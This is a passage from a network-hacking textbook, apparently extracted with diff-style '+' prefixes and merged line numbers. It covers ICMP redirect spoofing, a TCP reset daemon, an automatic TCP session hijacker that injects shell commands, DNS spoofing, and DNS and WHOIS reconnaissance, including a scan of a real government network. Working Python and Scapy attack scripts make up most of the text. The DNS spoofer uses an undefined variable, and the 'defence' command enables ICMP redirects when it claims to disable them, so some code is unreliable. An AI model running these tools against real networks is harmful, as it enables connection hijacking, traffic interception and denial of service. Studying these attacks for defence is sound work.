+ICMP is much more than the every day used ICMP-Echo aka ping command
+and the resulting Echo Response packet. ICMP is the error protocol of IP (seeSect. 2.8). It is used to tell computers that another host or a whole network or
+protocol is unreachable, to tell it that the TTL of a packet got exceeded or that arouter thinks it knows a quicker route to your destination and you should use that infuture connections.
+1#!/usr/bin/python
+23import sys
+4import getopt
+5from scapy.all import send, IP, ICMP
+6
+7# The address we send the packet to
+8target = None
+9
+10# The address of the original gateway
+11old_gw = None
+12
+13# The address of our desired gateway
+14new_gw = None
+15
+1617def usage():
+18 print sys.argv[0] + """
+19 -t <target>
+20 -o <old_gw>
+21 -n <new_gw>"""
+22 sys.exit(1)
+23
+24# Parsing parameter
+
+62 5 TCP/IP Tricks
+25try:
+26 cmd_opts = "t:o:n:r:"
+27 opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+28except getopt.GetoptError:
+29 usage()
+30
+31for opt in opts:
+32 if opt[0] == "-t":
+33 target = opt[1]
+34 elif opt[0] == "-o":
+35 old_gw = opt[1]
+36 elif opt[0] == "-n":
+37 new_gw = opt[1]
+38 else:
+39 usage()
+4041# Construct and send the packet
+42packet = IP(src=old_gw, dst=target) / \
+43 ICMP(type=5, code=1, gw=new_gw) / \
+44 IP(src=target, dst=’0.0.0.0’)
+45send(packet)
+The source code should look familiar, because it is mostly the same as the IP
+spooﬁng example in Sect. 5.6. It just differs in how we creates the packet. We
+construct a packet that looks like it is being sent from the old gateway or routerthat tells the target : “Hey there’s someone that can do the job better then me!”.
+Translated to ICMP that is code 1 ,type 5 ,a n dt h egwparameter includes the
+IP of the new gateway. Last but not least we must set the destination of the route inour case0.0.0.0 for overwriting the default route. Here you can deﬁne any other
+route you like to alter.
+ICMP redirection attacks can be easily defended against on a Linux system by
+deactivating the accept-redirects kernel option. This can be achieved by the
+following magic line:
+echo 1 > /proc/sys/net/ipv4/conf/all/accept_redirects
+or by editing /etc/systctl.conf and setting
+net.ipv4.conf.all.accept_redirects = 0
+BSD- and Mac OS X systems provide similar functionality.
+
+5.11 RST Daemon 63
+5.11 RST Daemon
+A RST daemon is a program that resets foreign TCP connections or, in other words,
+the attacker sends a spoofed TCP packet with the RST ﬂag set to terminate aconnection.
+1#!/usr/bin/python
+2
+3import sys
+4import getopt
+5import pcapy
+6from scapy.all import send, IP, TCP
+7from impacket.ImpactDecoder import EthDecoder, IPDecoder
+8from impacket.ImpactDecoder import TCPDecoder
+9
+10
+11dev = "eth0"
+12filter = ""
+13eth_decoder = EthDecoder()
+14ip_decoder = IPDecoder()
+15tcp_decoder = TCPDecoder()
+16
+1718def handle_packet(hdr, data):
+19 eth = eth_decoder.decode(data)
+20 ip = ip_decoder.decode(eth.get_data_as_string())
+21 tcp = tcp_decoder.decode(ip.get_data_as_string())
+22
+23 if not tcp.get_SYN() and not tcp.get_RST() and \
+24 not tcp.get_FIN() and tcp.get_ACK():
+25 packet = IP(src=ip.get_ip_dst(),
+26 dst=ip.get_ip_src()) / \
+27 TCP(sport=tcp.get_th_dport(),
+28 dport=tcp.get_th_sport(),
+29 seq=tcp.get_th_ack(),
+30 ack=tcp.get_th_seq()+1,
+31 flags="R")
+32
+33 send(packet, iface=dev)
+34
+35 print "RST %s:%d -> %s:%d" % (ip.get_ip_src(),
+36 tcp.get_th_sport(),
+37 ip.get_ip_dst(),
+38 tcp.get_th_dport())
+39
+
+64 5 TCP/IP Tricks
+40
+41def usage():
+42 print sys.argv[0] + " -i <dev> -f <pcap_filter>"
+43 sys.exit(1)
+44
+45try:
+46 cmd_opts = "f:i:"
+47 opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+48except getopt.GetoptError:
+49 usage()
+5051for opt in opts:
+52 if opt[0] == "-f":
+53 filter = opt[1]
+54 elif opt[0] == "-i":
+55 dev = opt[1]
+56 else:
+57 usage()
+5859pcap = pcapy.open_live(dev, 1500, 0, 100)
+60
+61if filter:
+62 filter = "tcp and " + filter
+63else:
+64 filter = "tcp"
+65
+66pcap.setfilter(filter)
+67print "Resetting all TCP connections on %s " + \
+68 "matching filter %s " % (dev, filter)
+69pcap.loop(0, handle_packet)
+The source code is a mix of a sniffer (see Sect. 5.4) and IP spooﬁng (Sect. 5.6).
+Only thehandle_packet function differs to a normal sniffer. It constructs a new
+packet that seems to come from the destina tion of the intercepted packet. Therefore
+it just ﬂips the destination and source address, destination and source port and setsthe acknowledgment number to the value of the sequence number plus one (havea look at Sect. 2.9if you don’t remember why). As sequence number we set the
+acknowledgment number, because that is th e sequence number the source expects
+next.
+The protection possibilities against such attacks are the same as against ordinary
+IP spooﬁng threats just use IPSec and sign your IP packets cryptographically.
+
+5.12 Automatic Hijack Daemon 65
+5.12 Automatic Hijack Daemon
+The creme de la creme of a TCP hijacking t oolkit is a mechanism to inject custom
+commands into an existing TCP connection. You can choose for it to happen eitherinteractively like in Ettercap ( http://ettercap.sourceforge.net ) or automatically like
+in P.A.T.H. ( http://p-a-t-h.sourceforge.net ).
+Since the author of this book is also one of the authors of the P.A.T.H. project we
+will implement a daemon that will wait for a certain payload and than automaticallyhijack that connection. So let’s go ’n get it!
+1#!/usr/bin/python
+23import sys
+4import getopt
+5from scapy.all import send, sniff, IP, TCP
+678dev = "eth0"
+9srv_port = None
+10srv_ip = None
+11client_ip = None
+12grep = None
+13inject_data = "echo ’haha’ > /tmp/hacked\n"
+14hijack_data = {}
+151617def handle_packet(packet):
+18 ip = packet.getlayer("IP")
+19 tcp = packet.getlayer("TCP")
+20 flags = tcp.sprintf("%flags%")
+2122 print "Got packet %s:%d -> %s:%d [%s]" % (ip.src,
+23 tcp.sport,
+24 ip.dst,
+25 tcp.dport,
+26 flags)
+27
+28 # Check if this is a hijackable packet
+29 if tcp.sprintf("%flags%") == "A" or \
+30 tcp.sprintf("%flags%") == "PA":
+31 already_hijacked = hijack_data.get(ip.dst, {})\
+32 .get(’hijacked’)
+3334 # The packet is from server to client
+35 if tcp.sport == srv_port and \
+
+66 5 TCP/IP Tricks
+36 ip.src == srv_ip and \
+37 not already_hijacked:
+3839 print "Got server sequence " + str(tcp.seq)
+40 print "Got client sequence " + str(tcp.ack) + "\n"
+4142 # Found the payload?
+43 if grep in str(tcp.payload):
+44 hijack_data.setdefault(ip.dst, {})\
+45 [’hijack’] = True
+46 print "Found payload " + str(tcp.payload)
+47 elif not grep:
+48 hijack_data.setdefault(ip.dst, {})\
+49 [’hijack’] = True
+5051 if hijack_data.setdefault(ip.dst, {})\
+52 .get(’hijack’):
+5354 print "Hijacking %s:%d -> %s:%d" % (ip.dst,
+55 tcp.dport,
+56 ip.src,
+57 srv_port)
+5859 # Spoof packet from client
+60 packet = IP(src=ip.dst, dst=ip.src) / \
+61 TCP(sport=tcp.dport,
+62 dport=srv_port,
+63 seq=tcp.ack + len(inject_data),
+64 ack=tcp.seq + 1,
+65 flags="PA") / \
+66 inject_data
+6768 send(packet, iface=dev)
+6970 hijack_data[ip.dst][’hijacked’] = True
+717273def usage():
+74 print sys.argv[0]
+75 print """
+76 -c <client_ip> (optional)
+77 -d <data_to_inject> (optional)
+78 -g <payload_to_grep> (optional)
+79 -i <interface> (optional)
+80 -p <srv_port>
+
+5.12 Automatic Hijack Daemon 67
+81 -s <srv_ip>
+82 """
+83 sys.exit(1)
+8485try:
+86 cmd_opts = "c:d:g:i:p:s:"
+87 opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+88except getopt.GetoptError:
+89 usage()
+9091for opt in opts:
+92 if opt[0] == "-c":
+93 client_ip = opt[1]
+94 elif opt[0] == "-d":
+95 inject_data = opt[1]
+96 elif opt[0] == "-g":
+97 grep = opt[1]
+98 elif opt[0] == "-i":
+99 dev = opt[1]
+100 elif opt[0] == "-p":
+101 srv_port = int(opt[1])
+102 elif opt[0] == "-s":
+103 srv_ip = opt[1]
+104 else:
+105 usage()
+106107if not srv_ip and not srv_port:
+108 usage()
+109
+110if client_ip:
+111 print "Hijacking TCP connections from %s t o"+\
+112 "%s on port %d" % (client_ip,
+113 srv_ip,
+114 srv_port)
+115116 filter = "tcp and port " + str(srv_port) + \
+117 " and host " + srv_ip + \
+118 "and host " + client_ip
+119else:
+120 print "Hijacking all TCP connections to " + \
+121 "%s on port %d" % (srv_ip,
+122 srv_port)
+123124 filter = "tcp and port " + str(srv_port) + \
+125 " and host " + srv_ip
+
+68 5 TCP/IP Tricks
+126
+127sniff(iface=dev, store=0, filter=filter, prn=handle_packet)
+The main functionality of the program is implemented in the function
+handle_packet() . Here we ﬁrstly check if the intercepted packet has got the
+ACK or the ACK and PUSH ﬂags set. This tells us that it belongs to an establishedconnection. Next we have a look at the IP addresses and determine if the packet wassent from the server to the client. We are only interested in those packets, becausewe want to inject our own code to the server. If we got such a packet we try to matchthe packets payload with th e payload we expect. In case it matches, we construct
+a packet that looks like it has been sent by the client by ﬂipping the ips and ports,use the acknowledgment number as seque nce number, because we remember the
+acknowledgment number is the sequence number that the source expects next andadd the length of our payload to it. For every byte sent the sequence number getsincreased by one. As acknowledgment number we just use the sniffed sequencenumber plus one, because this would be t he next sequence number we would expect
+if we cared about the ongoing connection.
+Theoretically we could inject more than one packet thus taking over the whole
+connection. The client is then not able to use it anymore. From their point of view itwill hang, because it will always send ACK packages with a sequence number thatis too low. This can, under circumstan ces, lead to ugly ACK storms, because the
+server sends a RST packet back for every packet, but the client keeps sending its oldsequence numbers. In our example we shall not care about it, but the experiencedreader can extend the script to send the client a RST packet and terminate its
+connection to avoid such ACK storms.
+Last but not least, it should be noted that you might need to append an \n to the
+payload depending on the protocol, otherwise it could be that it is only written ontoscreen but not executed like in Telnet.
+5.13 Tools
+5.13.1 Scapy
+Scapy is not only a fantastic Python library but also a great tool. When you start
+Scapy manually from the console you get its interactive mode, which is a Pythonconsole with all Scapy modules automatically loaded.
+scapy
+The command ls() shows you all available protocols:
+>>> ls()
+ARP : ARPASN1_Packet : NoneBOOTP : BOOTP...
+
+5.13 Tools 69
+A complete list of all protocols implemented in Scapy can be found in Table A.1.
+To get all header options including default values for a protocol just insert the
+protocols name as parameter into the function ls() .
+>>> ls(TCP)
+sport : ShortEnumField = (20)dport : ShortEnumField = (80)seq : IntField = (0)ack : IntField = (0)dataofs : BitField = (None)reserved : BitField = (0)flags : FlagsField = (2)window : ShortField = (8192)chksum : XShortField = (None)urgptr : ShortField = (0)options : TCPOptionsField = ({})
+The command lsc() can be used to show an overview of all functions and their
+description.
+>>> lsc()
+arpcachepoison : Poison target’s cache with (your MAC,
+victim’s IP) couple
+arping : Send ARP who-has requests to determine
+which hosts are up
+...
+The Table 5.1gives you an overview of the most important functions in Scapy, a
+complete list can be found in Table A.2.
+Additionally the Scapy shell can be programmed like before. Here is another
+short example on how to implement a HTTP GET command, which will not receiveany data, because the previous TCP handshake is missing.
+Table 5.1 Important Scapy functions
+Name Description
+send() Sends a packet on layer 3
+sendp() Sends a packet on layer 2
+sr() Sends and receives on layer 3
+srp() Sends and receives on layer 2
+sniff() Captures network trafﬁc and executes callback function for every packet
+RandMAC() Generates a random MAC address
+RandIP() Generates a random IP address
+get_if_hwaddr() Gets the MAC address of a network interface
+get_if_addr() Gets the IP address of a network interface
+ls() Lists all available protocols
+ls(protocol) Shows details of a protocol
+lsc() Gets an overview of all commands
+help() Prints the documentation of a function or protocol
+
+70 5 TCP/IP Tricks
+>>> send( IP(dst="www.datenterrorist.de") /\
+TCP(dport=80, flags="A")/"GET / HTTP/1.0 \n\n" )
+Another keen feature of Scapy is statistical evaluation of transmitted and received
+packets as graphs such as the distribution of TCP sequence numbers. For this youneed to have the Gnuplot library ( http://www.gnuplot.info ) installed as well as the
+Gnuplot Python module.
+pip install gnuplot-py
+Now you can plot the received packets.
+ans, unans = sr(IP(dst="www.datenterrorist.de", \
+id=[(0,100)]) /\
+TCP(dport=80)/"GET / HTTP/1.0\n\n")
+ans.plot(lambda x: x[1].seq)
+Thelambda function gets called for every received packet and calls the
+plot() function with the packets sequence number, which magically creates a
+nice image onto your screen.
+Figure 5.1shows why the sequence number is called sequence number, thus
+we see a straight line. The initial sequence number is generated randomly but thefollowing are just incremented for every byte sent (see Sect. 2.9).
+3+12 e+09
+3+11 e+09
+3+1e+09
+3+09 e+09
+3+08 e+09
+3+07 e+09
+3+06 e+09
+3+07608 e+090 1 02 03 04 05 06 07 08 0 9 0
+47 +8188,
+Fig. 5.1 TCP sequence numbers
+
+5.13 Tools 71
+If you want to know even more about Scapy, you should have a look at the
+excellent ofﬁcial Scapy documentation, which can be found under http://www.
+secdev.org/projects/scapy/doc/usage.html .
+There you can not only get a good description of every function but also quite
+long list of useful one-liners like traceroute or VLAN hopping and cool addons likefuzzing, active and passive ﬁngerprinting, ARP poisoning, ARP ping and DynDNS.
+
+Chapter 6
+WHOIS DNS?
+Abstract DNS or Domain Name System is like the telephone book of the internet
+or intranet. It resolves IP addresses that are hard to remember to names like www.
+ccc.de orwww.springer.com and vice versa. Forward name resolution to IP are
+realized by A records and reverse lookups via PTR records . Furthermore DNS
+is also used to ﬁnd out the mail server of a domain with the help of MX records
+and the responsible nameserver via NS records .CNAME records can be used to
+declare aliases for hostnames. Last but not least DNS can also be used as a poormans load balancer by implementing a round robin procedure.
+DNS offers a simple and silent variant of the man-in-the-middle attack. Thus
+most of the time you only have to spoof a single DNS response packet to hijack allpackets of a connection. Most computer s nowadays use a DNS caching mechanism
+to save the resolved hostnames and only send a new request if the old IP is no longerreachable.
+Names of computers are usually far more than just a nice sticker, though they
+contain information about their usage and sometimes even details about the networkor location. A computer named rtr3.ffm.domain.net for example is one of at least 3routers in the city Frankfurt am Main.
+6.1 Protocol Overview
+Figure 6.1shows a typical DNS header.
+The ID ﬁeld, as the name implies, includes a unique identiﬁcation number for
+letting the client know to which request a response belongs. The QR option tells usif the packet is a query (bit is set to zero) or a response (bit is 1). The OP code deﬁnesthe type of request. Zero stands for forward and one for reverse lookup. Responsesinstead use the RCODE ﬁeld to mark a response as successful by setting the bit tozero, one stands for a failed request and 2 for server error.
+The AA bit tells us if the response was authorized (1) thus the server itself is
+responsible for the requested domain or if it has forwarded our request to anotherserver. The TZ bit shows if a response was truncated, because it was longer than512 byte.
+© Springer-Verlag Berlin Heidelberg 2015
+B. Ballmann, Understanding Network Hacks , DOI 10.1007/978-3-662-44437-5_673
+
+74 6 WHOIS DNS?
+Fig. 6.1 DNS-Header
+You cannot only request information of a DNS server about a single host or IP,
+but also about a whole domain (see Sect. 6.3). That is performed with recursion and
+a set RD bit (Recursion desired). If you get an answer with RA bit set to zero than
+recursion is not available to you on the requested server.
+6.2 Required Modules
+Install Scapy if it is not installed yet by invoking the following command.
+pip install Scapy
+6.3 Questions About Questions
+With the help of DNS you can get a lot of information about a domain as you can
+see based on the types of queries in this Table 6.1. You can, for example, ask for the
+domain’s mail server.
+host -t MX domain.net
+Just specify the record type you want to ask behind the option -tand try out
+what the server answers!
+As mentioned, in the protocol overview before, you can send recursive requests
+to the DNS server to retrieve all records of a domain. Normally this is used for
+syncing slave servers, but if the nameserver is misconﬁgured an attacker can grab a
+whole bunch of precious information.
+host -alv domain.net
+In case the previous command returns a lot of results you probably should think
+about reconﬁguring your nameserver to permit recursion only to your slave servers.
+
+6.4 WHOIS 75
+Table 6.1 The most important DNS record types
+Name Function
+A R e s o l v en a m et oI P
+CERT Certiﬁcate record for PGP server or similar
+CNAME Alias for a host name
+DHCID Deﬁnes DHCP server for a domain
+DNAME Alias for a domain name
+DNSKEY Key to use for DNSSEC
+IPSECKEY Key to use for IPsec
+LOC Location record
+MX Deﬁnes the mail server of a domain
+NS Deﬁnes the name server of a domain
+PTR Resolve IP to name
+RP Responsible person
+SSHFP SSH public key
+6.4 WHOIS
+Suppose you have an IP address and want to know who it belongs to. For such
+tasks a so called WHOIS databases exists on the side of the NIC services such asDENIC, which registers domains and host the root servers for their speciﬁc TLDslike.de. IP addresses, as opposed to Domains, are registered with RIPE Network
+Coordination Centre. Either your provider or yourself need to be a member of RIPEto register a netblock.
+The WHOIS databases of RIPE and NICs, like DENIC, can often be accessed
+via web interface on the NICs website but more easily and elegantly you can alsouse the console.
+whois 77.87.229.40
+% This is the RIPE Database query service.% The objects are in RPSL format.%% The RIPE Database is subject to Terms and Conditions.% See http://www.ripe.net/db/support/db-terms-conditions.pdf
+% Note: this output has been filtered.
+% To receive output for a database update,% use the "-B" flag.
+% Information related to ’77.87.224.0 - 77.87.231.255’inetnum: 77.87.224.0 - 77.87.231.255
+netname: BSI-IVBBdescr: Bundesamt fuer Sicherheit in derdescr: Informationstechnikcountry: DEorg: ORG-BA202-RIPE
+
+76 6 WHOIS DNS?
+admin-c: OE245-RIPE
+tech-c: OE245-RIPEstatus: ASSIGNED PImnt-by: RIPE-NCC-END-MNTmnt-by: BSI-IVBBmnt-by: DTAG-NICmnt-lower: RIPE-NCC-END-MNTmnt-routes: BSI-IVBBmnt-domains: BSI-IVBBsource: RIPE # Filtered
+person: Olaf Erber
+address: Bundesamt fuer Sicherheit in der ITaddress: Postfach 20 03 63address: 53133 Bonnaddress: Germanyphone: +49 3018 9582 0e-mail: ipbb_ivbb@bsi.bund.denic-hdl: OE245-RIPEmnt-by: DFN-NTFYsource: RIPE # Filtered
+% Information related to ’77.87.228.0/22AS49234’
+route: 77.87.228.0/22
+descr: BSI-IVBBorigin: AS49234mnt-by: BSI-IVBBsource: RIPE # Filtered
+As you can see we not only get to know who owns an IP address, but also who
+is managing the zone, who is the responsible administrator and to which netblockit belongs (77.87.224.0 - 77.87.231.255) . WHOIS request cannot only view you
+information about an IP address but also about a domain or hostname.
+6.5 DNS Dictionary Mapper
+A potential attacker that wants to get a list of important servers quickly withoutrumbling through the net by ﬁring noisy port-scans could for instance use DNS forscanning. First of all he might try to transfer the whole zone (see Sect. 6.3), but
+this could also trigger an alarm by a network intrusion detection systems and bythe way, nowadays DNS server that allow a complete zone transfer to the world are
+really rare.
+Another method to collect hostnames of a domain is the application of a DNS
+mapper. It reads a dictionary of common server names, appends the domain nameto each of them and tries to resolve it’s IP address by issuing a DNS query. If itsucceeds the possibility that this host exist s is quite high or you found a messy zone
+with zombie entries.
+
+6.6 Reverse DNS Scanner 77
+The following script implements a simple DNS mappers. For the dictionary we
+create a text ﬁle ﬁlled with possible hostnames per line.
+1#!/usr/bin/python
+23import sys
+4import socket
+56if len(sys.argv) < 3:
+7print sys.argv[0] + ": <dict_file> <domain>"
+8sys.exit(1)
+9
+1011def do_dns_lookup(name):
+12 try:
+13 print name + " : " + socket.gethostbyname(name)
+14 except socket.gaierror, e:
+15 print name + " : " + str(e)
+16
+17try:
+18 fh = open(sys.argv[1], "r")
+19
+20 for word in fh.readlines():
+21 do_dns_lookup(word.strip() + "." + sys.argv[2])
+22
+23 fh.close()
+24except IOError:
+25 print "Cannot read dictionary " + file
+The only thing new in this source code should be the function
+socket.gethostbyname() , that simply takes a hostname and returns the
+IP address.
+6.6 Reverse DNS Scanner
+The reverse method gets you to your target quicker, at least if there are PTR recordsfor the IP addresses. However, today this is mostly always the case, because serviceslike SMTP rely on it for spam ﬁltering purpose.
+If you found out the net belonging to an IP by using WHOIS (Sect. 6.4) you
+could, in the next step, build a little scri pt that takes the net as input in the form
+of 192.168.1.1-192.168.1.254. The function get_ips() splits the start and the
+end IP into its bytes and converts the IP into a decimal number. The while loop
+increments the start IP by one and converts it back to a 4 byte IP address until itreaches the end IP. Maybe you may now ask why is it coded so complicated? Why
+
+78 6 WHOIS DNS?
+not only add one to the last number? Sure you can implement the algorithm that
+way and all is well as long as you don’t try to scan a network larger than a class c.Thus only the last byte is available for hosts otherwise you will need an algorithmthat can calculate addresses for class b and a networks.
+1#!/usr/bin/python
+23import sys
+4import socket
+5from random import randint
+6
+7if len(sys.argv) < 2:
+8print sys.argv[0] + ": <start_ip>-<stop_ip>"
+9sys.exit(1)
+1011
+12def get_ips(start_ip, stop_ip):
+13 ips = []
+14 tmp = []
+15
+16 for i in start_ip.split(’.’):
+17 tmp.append("%02X" % long(i))
+1819 start_dec = long(’’.join(tmp), 16)
+20 tmp = []
+2122 for i in stop_ip.split(’.’):
+23 tmp.append("%02X" % long(i))
+24
+25 stop_dec = long(’’.join(tmp), 16)
+2627 while(start_dec < stop_dec + 1):
+28 bytes = []
+29 bytes.append(str(int(start_dec / 16777216)))
+30 rem = start_dec % 16777216
+31 bytes.append(str(int(rem / 65536)))
+32 rem = rem % 65536
+33 bytes.append(str(int(rem / 256)))
+34 rem = rem % 256
+35 bytes.append(str(rem))
+36 ips.append(".".join(bytes))
+37 start_dec += 1
+38
+39 return ips
+40
+
+6.6 Reverse DNS Scanner 79
+41
+42def dns_reverse_lookup(start_ip, stop_ip):
+43 ips = get_ips(start_ip, stop_ip)
+44
+45 while len(ips) > 0:
+46 i = randint(0, len(ips) - 1)
+47 lookup_ip = str(ips[i])
+4849 try:
+50 print lookup_ip + " :"+\
+51 str(socket.gethostbyaddr(lookup_ip)[0])
+52 except (socket.herror, socket.error):
+53 pass
+54
+55 del ips[i]
+5657start_ip, stop_ip = sys.argv[1].split(’-’)
+58dns_reverse_lookup(start_ip, stop_ip)
+The function dns_reverse_lookup() is doing the rest of the work.
+It randomly iterates over the calculated IP address space and sends a reversequery with the help of the function socket.gethostbyaddr() . Errors of
+gethostbyaddr() like “Unknown host” get dropped by the try-except block.
+Running this script on the IP addresses of the German federal bureau for radiation
+protection you get the following result:
+./reverse-dns-scanner.py 194.94.68.0-194.94.69.255
+194.94.69.75: ngainfo.bfs.de194.94.69.82: extranet.bfs.de194.94.69.121: www.bfs.de194.94.69.77: sk.bfs.de194.94.69.68: groupware.bfs.de194.94.69.71: test.bfs.de194.94.69.100: ox-groupware.bfs.de194.94.69.70: assearchive.bfs.de194.94.69.123: jp-files.bfs.de194.94.69.114: ndkk.bfs.de194.94.69.80: mx02.sz.bfs.de194.94.69.72: isizurs.bfs.de194.94.69.106: node1.extern.bfs.de194.94.69.116: hrq.bfs.de194.94.69.94: tecdovpn.sz.bfs.de194.94.69.103: mx01.sz.bfs.de194.94.69.117: hrqreg.bfs.de194.94.69.122: node2.extern.bfs.de194.94.69.118: elan.bfs.de194.94.69.78: melodionline.bfs.de194.94.69.74: odlinfo.bfs.de194.94.69.69: intranet.bfs.de194.94.69.102: fw01.sz.bfs.de
+
+80 6 WHOIS DNS?
+194.94.69.67: dns01.bfs.de
+194.94.69.73: pvgb.bfs.de194.94.69.107: elan.imis.bfs.de194.94.69.104: rayvpn.bfs.de194.94.68.1: testptr.bfs.de194.94.69.81: burg.bfs.de194.94.69.111: era.bfs.de194.94.69.108: filetransfer.bfs.de194.94.69.83: doris.bfs.de
+As you can see such a scan quickly delivers interesting information about the
+network.
+6.7 DNS-Spooﬁng
+DNS spooﬁng, beside ARP spooﬁng (see Sect. 4.2), is the most popular variant of
+man-in-the-middle attacks. Similar to ARP spooﬁng the attacker sends a responsewith their own IP address as an answer to a DNS query in the hope that their answerarrives before the answer of the real name server.
+Therefore we use the much loved Scapy library. The source code of the RST
+daemon (see Sect. 5.11) is very similar. We sniff the network trafﬁc with the help
+of Scapyssniff() function, but this time we are only interested in UDP packets
+from or to port 53. DNS can be used together with TCP but we skip those unusualpackets to keep the code as simple as possible. Additionally the tool needs a hostﬁle to know for which host it should spoof which IP address.
+1217.79.220.184 *
+280.237.132.86 www.datenliebhaber.de
+3192.168.23.42 www.ccc.de
+The format of the host ﬁle is the same as the /etc/hosts ﬁle known from Linux
+or Unix systems. The ﬁrst entry is the IP address and the second the hostnamedivided by a space. An asterisk as hostname means we should spoof this IP for allhostnames.
+1#!/usr/bin/python
+2
+3import sys
+4import getopt
+5import scapy.all as scapy
+6
+7dev = "eth0"
+8filter = "udp port 53"
+9file = None
+10dns_map = {}
+11
+
+6.7 DNS-Spooﬁng 81
+12def handle_packet(packet):
+13 ip = packet.getlayer(scapy.IP)
+14 udp = packet.getlayer(scapy.UDP)
+15 dhcp = packet.getlayer(scapy.DHCP)
+16
+17 # standard (a record) dns query
+18 if dns.qr == 0 and dns.opcode == 0:
+19 queried_host = dns.qd.qname[:-1]
+20 resolved_ip = None
+21
+22 if dns_map.get(queried_host):
+23 resolved_ip = dns_map.get(queried_host)
+24 elif dns_map.get(’ *’):
+25 resolved_ip = dns_map.get(’ *’)
+26
+27 if resolved_ip:
+28 dns_answer = scapy.DNSRR(rrname=queried_host + ".",
+29 ttl=330,
+30 type="A",
+31 rclass="IN",
+32 rdata=resolved_ip)
+33
+34 dns_reply = scapy.IP(src=ip.dst, dst=ip.src) / \
+35 scapy.UDP(sport=udp.dport,
+36 dport=udp.sport) / \
+37 scapy.DNS(
+38 id = dns.id,
+39 qr = 1,
+40 aa = 0,
+41 rcode = 0,
+42 qd = dns.qd,
+43 an = dns_answer
+44 )
+45
+46 print "Send %s has %s to %s" % (queried_host,
+47 resolved_ip,
+48 ip.src)
+49 scapy.send(dns_reply, iface=dev)
+50
+5152def usage():
+53 print sys.argv[0] + " -f <hosts-file> -i <dev>"
+54 sys.exit(1)
+55
+56
+
+82 6 WHOIS DNS?
+57def parse_host_file(file):
+58 for line in open(file):
+59 line = line.rstrip(’\n’)
+60
+61 if line:
+62 (ip, host) = line.split()
+63 dns_map[host] = ip
+6465try:
+66 cmd_opts = "f:i:"
+67 opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+68except getopt.GetoptError:
+69 usage()
+70
+71for opt in opts:
+72 if opt[0] == "-i":
+73 dev = opt[1]
+74 elif opt[0] == "-f":
+75 file = opt[1]
+76 else:
+77 usage()
+78
+79if file:
+80 parse_host_file(file)
+81else:
+82 usage()
+8384print "Spoofing DNS requests on %s" % (dev)
+85scapy.sniff(iface=dev, filter=filter, prn=handle_packet)
+The function handle_packet gets invoked for every sniffed packet. It ﬁrst
+decodes the IP, UDP and DNS layer to access single protocol properties and ensuresthat we really caught a DNS query packet. The header property qris set to zero if
+the packet is in fact a DNS query and set to one if it is a response packet. The optionopcode in contrast deﬁnes the subtype of the packet. Zero stands for a “normal” A
+record request and therefore resolves a hostname to an IP address. A PTR requestresolves the name to an IP (for more subtypes please have a look at Table 6.1). The
+AAbit deﬁnes if this packet contains an aut horitative answers thus the queried server
+is itself responsible for the requested domain or if it itself just forwarded the request.Thercode option is responsible for error handling. A value of zero indicates no
+failure in resolution.
+In every DNS response the query is included beside the answer. The answer
+simply consists of the requested host, the spoofed IP address read from our hostﬁle and the Type A to indicate a forward resolve together with the |lstinine|rclass
+IN| for a Internet address. Source and destination IP and port get switched, because
+
+6.8 Tools 83
+this packet is a response to the packet we caught. Last but not least, the packet is of
+course sent back.
+This kind of attack is very simple to detect as one can see two response packets
+for just one request. Furthermore variants of DNS evolved to sign their repliescryptographically so the client can realize if it is a legal answer or not. The mostcommonly deployed variant is DNSSEC.
+6.8 Tools
+6.8.1 Chaosmap
+Chaosmap is a DNS / Whois / web server scanner and information gathering tool.
+It implements a DNS mapper, which can optionally send WHOIS requests andthus lookup the owner of a domain or IP. This applies also to reverse lookups. Inaddition, it is suitable for scanning web servers with the help of a dictionary to ﬁndhidden devices and ﬁles such as password and backup ﬁles. If needed these ﬁles anddirectories can be ﬁrst searched on Google before requesting the real web server.Last but not least, it can be used to harvest e-mail addresses for a given domain orto scan a domain for so called Google hacking requests.
+
+Chapter 7
+HTTP Hacks
+Abstract Hyper Text Transfer Protocol or HTTP for short, is probably the most
+known protocol of the Internet. Today it is so dominant that plenty of people eventhink HTTP (or the WWW) is the Internet.
+There are not only information sites, shopping portals, search engines, e-mail and
+forum services, but also ofﬁce software, wikis, blogs, calendars, social networks,chat software, e-government applications and so on. The list could be extended asdesired. Google even built a whole operating system that consist completely of webapplications and data stored in the cloud (it depends on you if you like that or not).
+It should not be surprising that most attacks nowadays are aimed at web
+applications and that the web browser is the favorite attack tool. Enough reasonsto have a deeper look at the security of the web.
+7.1 Protocol Overview
+HTTP is a stateless plaintext protocol. That means every request is sent as simpletext and is independent of the previous one. Therefore it’s quite easy to play “webbrowser” for yourself. Use the good old program telnet or the famous netcat
+tool to connect to some web server on port 80 and send it the following request:
+telnet www.datenterrorist.de 80
+GET / HTTP/1.0
+You’re done. That’s all you really need for a valid HTTP 1.0 request. Close the input
+with an empty line by pressing return and the server will send you a response backas if you had triggered the request with a normal browser. Let’s see in detail whathas happened here.
+GET is the so called HTTP method, there are more available as you can see in
+the Table 7.1.GET should be used to request a resource, POST therefore, to send
+data, aPOST request is guaranteed to be sent only one time or the user is asked if
+he or she wants to resend it. Additionally HTTP 1.0 deﬁnes a HEAD method, that
+implements a GET method without expecting the content body namely the HTML
+page, image or whatever, the server just sends the HTTP headers back. HTTP 1.1deﬁnes ﬁve more methods: PUT to create a new resource or update an existing
+one, DELETE to delete a resource, OPTIONS to request the available methods
+and other properties such as available content encodings, TRACE for debugging
+© Springer-Verlag Berlin Heidelberg 2015
+B. Ballmann, Understanding Network Hacks , DOI 10.1007/978-3-662-44437-5_785
+
+86 7 HTTP Hacks
+Table 7.1 HTTP methods
+Method Description
+GET Request a resource
+POST Send data to store or update it on the server
+HEAD Receive just the header of a request
+PUT Create or update a resource
+DELETE Delete a resource
+OPTIONS List all methods, content types and encodings supported by the web server
+TRACE Send the input back as output
+CONNECT Connect this server/proxy to another HTTP server/proxy
+Fig. 7.1 HTTP-request-header
+purpose and CONNECT to make the web server open a connection to another web
+server or proxy.
+The method TRACE should always be disabled on your web servers, because
+attackers are able to abuse it by implementing a so called cross site scripting attack
+(see Sect. 7.11).
+Additionally HTTP 1.1 requests are required to have a host header.
+telnet www.codekid.net 80
+GET / HTTP/1.1
+Host: www.codekid.net
+All other header options that you can use (see Fig. 7.1), are optional. By sending the
+optionConnection we can tell the web server that we will send other requests
+and they should not close the connection after this one. Content-Length deﬁnes the
+length of the content body in bytes, Content-Type the MIME type. Other important
